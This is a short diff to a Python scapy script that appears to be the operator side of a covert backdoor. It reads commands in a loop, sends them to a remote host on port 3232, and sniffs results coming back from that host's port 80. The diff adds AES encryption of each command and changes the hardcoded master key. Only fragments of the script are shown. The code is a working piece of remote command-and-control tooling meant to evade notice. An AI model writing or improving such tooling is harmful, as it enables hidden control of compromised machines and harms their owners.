@@ -21,10 +21,11 @@
 import argparse
 import os
 import logging
+import base64
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Surpress scapy errors
 from scapy.all import *
 from Crypto.Cipher import AES
-MASTER_KEY = "CorrectHorseBatterySta"  # AES master key
+MASTER_KEY = "CorrectHorseBatteryStapleGunHead"  # AES master key
 
 
 # ========================================================================
@@ -160,6 +161,7 @@ def main():
         dport = 3232
     while(1):
         cmd = raw_input("Command to execute: ")
+        cmd = encrypt_val(cmd)
         send_cmd(args.destIP, dport, cmd)
         sniff(filter="tcp and src {} and src port 80".format(args.destIP), count=1, prn=print_result)
 
